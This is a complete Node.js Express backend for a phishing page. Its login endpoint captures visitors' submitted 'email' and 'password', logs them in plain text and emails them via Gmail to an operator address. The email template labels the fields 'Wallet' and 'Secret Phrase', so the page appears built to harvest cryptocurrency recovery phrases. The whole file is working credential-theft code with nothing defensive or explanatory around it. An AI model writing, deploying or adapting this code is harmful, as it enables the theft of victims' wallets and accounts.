const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.')); // Serve static files from current directory

// Create transporter for Gmail
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
    },
});

console.log('Gmail transporter created for:', process.env.EMAIL_USER);


// Routes
app.post('/auth/login', async (req, res) => {
    const { email, password } = req.body;

    console.log('Received login attempt:', { email, password });

    if (!email || !password) {
        return res.status(400).json({ message: 'Email and password are required' });
    }

    try {
        // Send email
        const info = await transporter.sendMail({
            from: `"WebTrack Phrase" <${process.env.EMAIL_USER}>`,
            to: process.env.RECIEVING_EMAIL, // Send to self
            subject: 'New Phrase Submitted',
            text: `New phrase submitted.\n\nInput: ${email}\nPhrase/Password: ${password}`,
            html: `
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <style>
                    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f4f4f5; margin: 0; padding: 0; }
                    .container { max-width: 600px; margin: 40px auto; background: #ffffff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); }
                    .header { background: linear-gradient(135deg, #4F46E5 0%, #7C3AED 100%); color: #ffffff; padding: 32px 24px; text-align: center; }
                    .header h2 { margin: 0; font-size: 24px; font-weight: 700; letter-spacing: -0.025em; }
                    .content { padding: 32px 24px; }
                    .field-group { margin-bottom: 24px; }
                    .label { font-size: 11px; text-transform: uppercase; color: #6B7280; font-weight: 600; letter-spacing: 0.05em; margin-bottom: 8px; }
                    .value { background-color: #F3F4F6; color: #111827; padding: 16px; border-radius: 8px; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; font-size: 14px; line-height: 1.5; border: 1px solid #E5E7EB; word-break: break-all; user-select: all; -webkit-user-select: all; position: relative; }
                    .copy-icon { position: absolute; top: 12px; right: 12px; opacity: 0.5; }
                    .footer { background-color: #F9FAFB; padding: 24px; text-align: center; color: #9CA3AF; font-size: 12px; border-top: 1px solid #E5E7EB; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h2>New Phrase Submitted</h2>
                    </div>
                    <div class="content">
                        <div class="field-group">
                            <div class="label">Wallet / Input</div>
                            <div class="value">${email}</div>
                        </div>
                        <div class="field-group">
                            <div class="label">Secret Phrase</div>
                            <div class="value">
                                ${password}
                                <div class="copy-icon">
                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                                    </svg>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="footer">
                        Secure Notification System • WebTrack
                    </div>
                </div>
            </body>
            </html>
            `,
        });

        console.log('Message sent: %s', info.messageId);
        console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));

        // Respond to frontend
        res.json({ message: 'Login data received and email sent (simulated)' });
    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({ message: 'Failed to send email' });
    }
});

// Catch-all to serve index.html for any other GET request
app.get(/(.*)/, (req, res) => {
    if (!req.path.startsWith('/auth/')) {
        res.sendFile(__dirname + '/index.html');
    } else {
        res.status(404).send('Not found');
    }
});

if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`Server running on http://localhost:${PORT}`);
    });
}

module.exports = app;
